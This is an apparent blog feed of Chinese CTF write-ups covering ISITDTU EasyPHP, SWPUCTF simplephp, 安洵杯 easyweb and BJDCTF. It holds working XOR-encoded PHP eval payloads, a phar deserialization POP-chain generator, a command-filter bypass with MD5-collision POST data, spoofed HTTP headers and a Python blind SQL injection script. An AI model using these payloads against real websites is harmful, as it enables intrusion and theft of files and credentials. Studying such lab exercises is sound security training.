    <content><![CDATA[<h1 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]-EasyPHP"></a>[ISITDTU 2019]-EasyPHP</h1><p>进入题目给了源码</p>
<p>一步步分析：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">_ = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span></span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;, $_) )</span><br><span class="line">    die(&#x27;rosé will not do it&#x27;);</span><br><span class="line"></span><br><span class="line">if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )</span><br><span class="line">    die(&#x27;you are so close, omg&#x27;);</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">eval($</span><span class="bash">_);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>首先查看一下过滤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">for($</span><span class="bash">i=0;<span class="variable">$i</span>&lt;129;<span class="variable">$i</span>++)&#123;</span></span><br><span class="line">if(!preg_match(&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;, chr($i)))</span><br><span class="line">	echo (chr($i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有过滤的字符：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~</span><br></pre></td></tr></table></figure>

<p>第二个if功能：</p>
<p>将我们输入的字符串字母全部转换成小写然后统计里面字符出现的次数，如果长度小于13那么就可以执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strtolower — 将字符串转化为小写</span><br><span class="line">count_chars — 返回字符串所用字符的信息：</span><br><span class="line">第二个参数的作用：</span><br><span class="line">0 - 以所有的每个字节值作为键名，出现次数作为值的数组。  </span><br><span class="line">◦ 1 - 与 0 相同，但只列出出现次数大于零的字节值。  </span><br><span class="line">◦ 2 - 与 0 相同，但只列出出现次数等于零的字节值。  </span><br><span class="line">◦ 3 - 返回由所有使用了的字节值组成的字符串。  </span><br><span class="line">◦ 4 - 返回由所有未使用的字节值组成的字符串。 </span><br></pre></td></tr></table></figure>

<p>可以看到没有过滤的字符中有^和~</p>
<p>尝试一下phpinfo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&#x27;phpinfo&#x27;</span>^urldecode(%ff%ff%ff%ff%ff%ff%ff).<span class="string">&#x27;^%ff%ff%ff%ff%ff%ff%ff&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>%8F%97%8F%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code></p>
<p><img src="/2022/03/11/ISITDTU-EasyPHP/1.png" alt="1"></p>
<p>指令正常执行了</p>
<p>接下来就是继续构造数了</p>
<p>首先讲解一下如何构造异或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~按位取反</span><br><span class="line">^按位异或</span><br><span class="line">一般来说按位异或得到的结果会更多</span><br><span class="line">异或的构造</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/11/ISITDTU-EasyPHP/2.png" alt="1"></p>
<p>按位取反就比较单调了，比较一下他俩的区别：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(&#x27;phpinfo&#x27;^urldecode(&#x27;%ff%ff%ff%ff%ff%ff%ff&#x27;)).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo urlencode(~&#x27;phpinfo&#x27;);</span><br></pre></td></tr></table></figure>

<p>他俩的输出结果都是一样的，而异或的右边我们可以更改，所以一般来说如果都没有过滤用的多的还是异或</p>
<p>既然能够执行命令，那么剩下的就是构造命令</p>
<p>看一下phpinfo中禁用的函数：</p>
<p><img src="/2022/03/11/ISITDTU-EasyPHP/3.png" alt="1"></p>
<p>可以看到scandir，跟print_r的组合是没有被禁的</p>
<p>我们就得想办法构造出<code>print_r(scandir(.))</code></p>
<p>除去必须要的字符<code>^ (  )  ; _ .</code>字符，我们能够利用的字符数量只有7个，我们需要用七个字符串构造printscad，但是我们有只剩七个字符</p>
<p>所以我们需要删除，一般三个异或构造的情况会很多，所以用三个异或来看看那些字符是可以删的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">array = <span class="string">&#x27;acdisp &#x27;</span>   <span class="comment">#printscad             acdilps              readfil</span></span><br><span class="line">now = <span class="string">&#x27;printscad &#x27;</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> now:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> array:</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> array:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> array:</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">ord</span>(j)^<span class="built_in">ord</span>(m)^<span class="built_in">ord</span>(k)==<span class="built_in">ord</span>(i)):</span><br><span class="line">                        <span class="built_in">print</span>(i + <span class="string">&#x27;=&#x27;</span> + m + <span class="string">&#x27;^&#x27;</span> + j + <span class="string">&#x27;^&#x27;</span> + k)</span><br><span class="line">                        s += i</span><br><span class="line">a = s[<span class="number">0</span>]</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> (a!=s[i]):</span><br><span class="line">        a=s[i]</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> count == <span class="number">9</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以一直删直到可以完成条件，可以看到只需要六个字符就可以构造出完整的字符串</p>
<p>print_r(scandit(.));</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="meta">((%</span><span class="bash">9E%9E%9E%9B%9B%A0%9E)^(%8F%9C%9E%9C%9C%A0%9C)^(%9E%8F%96%96%8C%A0%8F)^(%FF%FF%FF%FF%FF%FF%FF))(((%9E%9E%9E%9B%9E%9E%9E)^(%9E%9E%9E%9C%9E%9E%9C)^(%8C%9C%9E%96%9B%96%8F)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF));</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/11/ISITDTU-EasyPHP/4.png" alt="1"></p>
<p>一眼就看出flag在末尾，我们用end来置换队列，然后用readfile读取文件就行了</p>
<p>因为调试起来非常麻烦所以我就直接给出答案了用<code>acedils</code>构造scandirefl只需要7个字符串</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">((%</span><span class="bash">8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));</span></span><br></pre></td></tr></table></figure>

<p>flag{b1f02f01-8607-453e-b495-a183409287ef}</p>
]]></content>
      <tags>
        <tag>ISITDTU</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF-2018-simplephp</title>
    <url>/2022/03/13/SWPUCTF-2018-easyphp/</url>
    <content><![CDATA[<h1 id="SWPUCTF-2018-simplephp"><a href="#SWPUCTF-2018-simplephp" class="headerlink" title="[SWPUCTF 2018]simplephp"></a>[SWPUCTF 2018]simplephp</h1><p>因为之前写过，文件丢失了，简单回顾一下phar反序列化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar反序列化需要的条件：</span><br><span class="line">1、文件上传点</span><br><span class="line">2、内置函数拥有某些文件类的函数</span><br></pre></td></tr></table></figure>



<p>进入题目有三个子页面，而且切换到中间页面的时候url上面会有一个file=的形式，猜测这里可以用伪协议什么的读取源码，第三个页面是一个文件上传的页面。</p>
<p>可以先用中间的页面读取一下源码，发现为协议没用，但是可以直接等于文件名拿到文件源码：</p>
<p>一共有6个页面。</p>
<p>有个class.php页面，先分别读取一下源码把</p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)#在类创建的最开始执行，赋值</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)            #在类结束之前执行，讲上面的赋值赋给<span class="title">test</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)#给不存在的属性赋值</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;<span class="comment">#赋值键值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;<span class="comment">#对我们读取的文件进行过滤，如果没有匹配到那就直接高亮文件</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;<span class="comment">#如果读取的文件中含有正则，就返回hacker跳转到index</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;<span class="comment">#params[source]=&#x27;/var/www/html/flag.php&#x27;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>既然知道了思路就应该想想如何利用了，我们最后需要利用到的地方是这个file_get_contents,往上继续调用就是get-&gt;__get这样只需要寻找在哪读取了不可访问的值就行，继续往上看，在<code>SHOW类的__tostring</code>里面，调用了一个source如果我们将str用test类实例的话他调用source就会进入下面的get那么如何进入tostring魔术方法呢，继续网上看，在C1e4r类中的析构方法，里面调用了echo，可以把str实例成show类的对象就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">整理一下思路：</span><br><span class="line">先实例一个C1e4r类，将其中的str实例成show类，</span><br><span class="line">在析构方法中echo触发show类里面的tostring方法</span><br><span class="line">执行$content=$this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">将str实例成test类，调用source属性，不存在，进入get方法</span><br><span class="line">调用get($key)也就是source</span><br><span class="line">最后执行source里面的内容</span><br><span class="line">我们直接给params里面键入source=&#x27;/var/www/html/flag.php&#x27;</span><br><span class="line">这样他就会读取flag.php的内容然后回显</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">既然知道了用phar来使用那么我们就构造反序列化</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line">chass Test</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> C1e4r();</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传文件之后需要在看一下function查看一下文件上传的规则，发现是以文件的全名加上自己的ip之后MD5</p>
<p>得到的，所以直接<code>phar://upload/md5.jpg</code>之后触发反序列化，最后拿到flag.php的源码，拿到flag</p>
]]></content>
      <tags>
        <tag>SWPUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯-2019-easy-web</title>
    <url>/2022/03/13/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</url>
    <content><![CDATA[<h3 id="安洵杯-2019-easyweb"><a href="#安洵杯-2019-easyweb" class="headerlink" title="[安洵杯 2019-easyweb]"></a>[安洵杯 2019-easyweb]</h3><p>进入题目：</p>
<p>可以看到地址栏：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://06bfcebd-4b7a-4fc3-a20b-5a27424b7776.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br></pre></td></tr></table></figure>

<p>img有一个很明显的信息，我们拿去解码一下：</p>
<p><img src="/2022/03/13/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/1.png" alt="1"></p>
<p>可以看到是一张图片文件经过编码之后的信息，尝试一下是不是可以读取源代码：</p>
<p>把index.php进行编码：<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p>
<p>把里面的信息替换，抓个包拿到图片的base64编码信息，拿去解码之后得到源码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line"><span class="meta">$</span><span class="bash">cmd = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span></span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line"><span class="meta">$</span><span class="bash">file = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span></span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>审计一下代码：</p>
<p>首先需要设置img以及cmd，对img进行编码，输入的文件不能带有flag，然后返回文件名所带的进行64编码之后的内容，然后输出</p>
<p>下面的if是针对cmd的，过滤了一些指令，其中<code>\\\\</code>过滤其实是有问题的，使得经过转移后的字符仍然可以继续执行，也就是完全没过滤\</p>
<p>直接构造代码，因为ls被过滤了，用dir代替或者l\s，进入下面的if下面的if考到了MD5的强碰撞，使得字符串不等而MD5值相等，直接去找网上的碰撞字符或者脚本就行（记住抓包的时候要post抓包）直接RCE</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>安洵杯</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF复现</title>
    <url>/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>今天复现了一下BJDCTF</p>
<h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>首先进入页面</p>
<p>是一个登录页面，以为是注入，随便输入了一下发现进去了，抓个包</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p>
<p>发现藏了一个网页，访问一下</p>
<p>第一次访问的时候网页显示发生了一个错误，刷新一下就可以发现下一步的提示（如果不刷新抓包的话没有在cookie中没有time）</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/2.png" alt="1"></p>
<p>抓个包</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/3.png" alt="1"></p>
<p>拿去解码一下发现是今天的日期，加九十九年，进入下一个提示</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/4.png" alt="1"></p>
<p>需要我们的ip是<code>localhost</code>自然而然想到<code>X-Forwarded-For</code></p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/5.png" alt="1"></p>
<p>另一种方式，可以用client-ip也一样是伪造ip</p>
<p>后面是需要伪造</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">who come from gem-love.com</span><br><span class="line">Referer: gem-love.com</span><br><span class="line">Sorry, this site is only optimized for browsers that run on Commodo 64</span><br><span class="line">User-Agent: Commodore 64</span><br><span class="line">Sorry, this site is only optimized for those whose email is root@gem-love.com</span><br><span class="line">From: root@gem-love.com</span><br><span class="line">Sorry, this site is only optimized for those who use the http proxy of y1ng.vip. if you dont have the proxy, pls contact us to buy, ￥100/Month</span><br><span class="line">Via: y1ng.vip</span><br></pre></td></tr></table></figure>

<p>最后可以在这里看到flag的base64编码（如果用hackbar添加头的话需要抓包，源码不显示）</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/6.png" alt="1"></p>
<h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>进入页面是一个登录框，结合题目名称，应该就是在这里注入了，fuzz发现单引号双引号全被过滤了</p>
<p>可以用的符号是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`!@#$%^*()_+[]&#123;&#125;\|:,./&lt;&gt;?</span><br></pre></td></tr></table></figure>

<p>可以发现反斜杠还有#没有被过滤，再找找别的，发现再robots,txt中藏了一个文件进去访问发现</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/7.png" alt="1"></p>
<p>他给出了我们在登陆框的查询语句，审计一下，单引号被过滤了所以username那边无法闭合，但是反斜杠没有被过滤，可以再最后添加一个反斜杠转义后面的单引号，然后可以用＃注释掉后面的单引号构造另一种闭合，也就是我们可以再password这添加我们的查询语句，测试的时候发现or没有被过滤，而为真的时候页面会回显</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/8.png" alt="1"></p>
<p>显而易见这就是一个盲注了，构造payload脚本：（因为查找过于慢，照着之前写的finalsql注入的脚本改的）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b49b6771-4b40-4bd5-8959-4bea5ae5fd40.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;&quot;username&quot;: &quot;admin\\&quot;, &quot;password&quot;: &quot;&quot;&#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while (True):</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">        # payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid)</span><br><span class="line">        payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line"></span><br><span class="line">        data[&#x27;password&#x27;] = payload</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        if &quot;stronger&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

